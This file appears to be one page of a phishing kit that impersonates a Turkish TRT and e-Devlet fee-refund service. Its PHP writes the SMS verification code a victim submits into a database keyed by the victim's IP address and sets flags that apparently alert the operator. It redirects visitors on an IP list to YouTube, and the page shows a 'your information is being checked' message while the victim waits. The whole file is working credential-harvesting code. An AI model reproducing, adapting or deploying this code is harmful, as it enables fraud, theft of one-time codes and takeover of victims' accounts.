<meta http-equiv="refresh" content="3;dogrulama2.php">

<?php 
foreach($_POST as $indexPost=>$valuePost) $_POST[$indexPost]=htmlspecialchars($valuePost,ENT_QUOTES);
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();

if ($_POST['sms1']<>"") {
$sms1 = $_POST['sms1'];
mysql_query("Update ak set sms1='$sms1' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
}
 
       $query =  mysql_query('SELECT * FROM ip5'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip5'] == $ipcik){ 
            echo "<script>window.location.href='sms2.php';</script>";
        } 
    }

    $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
           echo "<script>window.location.href='https://www.youtube.com/watch?v=ffF7W4rmkEk';</script>";
        } 
    }
?>


<!DOCTYPE html>
<!-- saved from url=(0037)https://aidatiadeniz.com/guvenlik.php -->
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>TRT | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./guvenlik_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./guvenlik_files/default.css">

</head>
<body id="top">

<div class="page_loader"></div>


<link rel="icon" type="image/x-icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png">
<form method="post" action="dogrulama.php" id="aspnetForm" autocomplete="off">




   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/bootstrap.min(1).css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/font-awesome.min(1).css">
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/flaticon(1).css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./guvenlik_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./guvenlik_files/style(1).css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./guvenlik_files/default(1).css">



<div class="page_loader"></div>



<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                       
                            <img src="http://www.globya.com.tr/wp-content/uploads/2016/03/clients-04.png" alt="logo">
                        </a>
                        <h3>TRT Online Aidat İade Sistemi</h3>


			         <font size="2" color="#960000"><b>Lütfen Bekleyiniz. <br>Verdiğiniz Bilgiler Kontrol Ediliyor.</b></font>
			         <br>
			         <br>
							
                           <img src="http://www.politicadedrogas.org/PPD/images/loading001.gif">
                            
                             
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        
                       
                </div>
            </div>
        </div>
    </div>
</div></section></form></body></html>